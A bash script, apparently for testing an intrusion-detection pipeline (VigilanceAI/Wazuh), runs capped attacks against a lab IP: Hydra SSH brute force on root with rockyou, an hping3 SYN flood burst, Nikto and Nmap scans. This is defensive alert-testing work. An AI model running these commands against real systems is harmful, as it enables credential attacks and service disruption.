#!/bin/bash
# ============================================================
# attack_simulation.sh — VigilanceAI fast attack simulation
# ------------------------------------------------------------
# Trimmed version: excludes full Nmap scans (too slow for quick
# testing). Keeps only attacks that complete in a few seconds
# to ~1 minute each, so you can trigger a batch of alerts and
# verify the classification pipeline quickly.
#
# Edit TARGET_IP below before running.
# ============================================================

set -e

TARGET_IP="192.168.80.129"       # <-- set to your actual target (e.g. ec2-target's IP)
SSH_PORT=22
WEB_PORT=80

echo "============================================================"
echo "VigilanceAI Fast Attack Simulation"
echo "Target: $TARGET_IP"
echo "Started: $(date)"
echo "============================================================"

# ------------------------------------------------------------
# 1. SSH Brute Force (Hydra) — limited attempts, fast wordlist
#    Capped at ~15 attempts so it finishes in seconds, not minutes.
# ------------------------------------------------------------
echo -e "\n[1/4] SSH Brute Force (Hydra, capped attempts)..."
if command -v hydra &> /dev/null; then
    timeout 30 hydra -l root -P /usr/share/wordlists/rockyou.txt \
        -t 4 -f -w 2 -e nsr \
        ssh://$TARGET_IP -s $SSH_PORT || true
else
    echo "  hydra not found — skipping"
fi

# ------------------------------------------------------------
# 2. Quick SYN Flood burst (hping3) — short burst, not sustained
#    -c limits packet count so it's a quick burst, not a long flood.
# ------------------------------------------------------------
echo -e "\n[2/4] Quick SYN Flood burst (hping3, 200 packets)..."
if command -v hping3 &> /dev/null; then
    timeout 15 sudo hping3 -S -p $SSH_PORT -c 200 --faster $TARGET_IP || true
else
    echo "  hping3 not found — skipping"
fi

# ------------------------------------------------------------
# 3. Nikto web scan — time-limited instead of full scan
#    -maxtime caps the scan duration regardless of target size.
# ------------------------------------------------------------
echo -e "\n[3/4] Web Vulnerability Scan (Nikto, capped at 20s)..."
if command -v nikto &> /dev/null; then
    timeout 25 nikto -h http://$TARGET_IP:$WEB_PORT -maxtime 20s || true
else
    echo "  nikto not found — skipping"
fi

# ------------------------------------------------------------
# 4. Fast targeted port check (replaces full Nmap scan)
#    Only scans the handful of ports you actually care about,
#    instead of a full 1-65535 sweep — finishes in ~1-2 seconds.
# ------------------------------------------------------------
echo -e "\n[4/4] Fast targeted port check (top ports only, no full scan)..."
if command -v nmap &> /dev/null; then
    timeout 15 nmap -T4 -F --top-ports 20 $TARGET_IP || true
else
    echo "  nmap not found — skipping"
fi

echo -e "\n============================================================"
echo "Fast attack simulation complete: $(date)"
echo "Check the VigilanceAI dashboard / Wazuh Alert Queue for new alerts."
echo "============================================================"
